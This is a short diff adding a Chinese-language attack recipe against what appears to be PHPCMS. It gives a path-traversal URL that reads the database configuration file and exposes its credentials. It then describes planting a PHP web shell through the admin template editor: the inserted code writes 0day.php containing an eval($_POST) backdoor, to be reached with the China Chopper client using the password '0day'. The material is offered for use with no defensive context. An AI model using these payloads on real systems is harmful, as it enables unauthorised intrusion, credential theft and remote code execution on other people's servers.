@@ -1,0 +1,12 @@
+直接爆出数据库连接信息：/index.php?m=search&c=index&a=public_get_suggest_keyword&url=asdf&q=../../phpsso_server/caches/configs/database.php
+
+关于后台拿webshell：进入后台后点击界面--模版风格--随便找个页面点击修改，插入我们的一句话代码
+
+<?
+ 
+$fp = @fopen("0day.php", 'a');
+ 
+@fwrite($fp, '<'.'?php'."\r\n\r\n".'eval($_POST[0day])'."\r\n\r\n?".">\r\n");
+
+点击保存，接着点击可视化，代码就成功执行了，接着菜刀连接/0day.php，密码0day
+ 
